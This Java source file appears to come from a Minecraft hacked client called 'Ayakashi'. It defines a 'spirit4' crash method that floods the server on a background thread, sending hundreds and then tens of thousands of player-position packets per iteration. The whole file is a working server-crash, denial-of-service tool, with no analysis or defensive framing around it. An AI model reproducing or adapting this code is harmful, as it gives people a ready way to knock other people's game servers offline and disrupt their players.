package Ayakashi.methods.impl;

import Ayakashi.helpers.ChatHelper;
import Ayakashi.methods.Crash;
import Ayakashi.methods.CrashInfo;
import Ayakashi.mods.notifications.Notification;
import Ayakashi.mods.notifications.NotificationManager;
import Ayakashi.mods.notifications.NotificationType;
import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C03PacketPlayer;

@CrashInfo(
        name = "spirit4"
)
public class CrashSpirit4 extends Crash {
    public void execute(Object... args) {
        int packets = (Integer) args[0];
        long start = System.currentTimeMillis();
        NotificationManager.show(new Notification(NotificationType.INFO, ChatHelper.fix("&4Ayakashi"), "Spirit method started!", 4));
        ChatHelper.sendMessage(String.format("Sending packets &8(&f%s&8) &8[&f%s&8]", this.getName().toUpperCase(), args[0]));

        (new Thread(() -> {
            try {
                for (int i = 0; i < packets; ++i) {
                    double x = Minecraft.getMinecraft().thePlayer.posX;
                    double y = Minecraft.getMinecraft().thePlayer.posY;
                    double z = Minecraft.getMinecraft().thePlayer.posZ;
                    double d1 = 0.0D;

                    int i3;
                    for (i3 = 0; i3 < 200; ++i3) {
                        d1 = i3 * 9;
                        Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x, y + d1, z, false));
                    }

                    for (i3 = 0; i3 < 10000; ++i3) {
                        double d2 = i3 * 9;
                        Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x, y + d1, z + d2, false));
                    }
                }
            } catch (Exception ignored) {
            }
        })).start();
        ChatHelper.sendMessage(String.format("Packets has been sent &8(&f%sms&8)", System.currentTimeMillis() - start));
    }
}
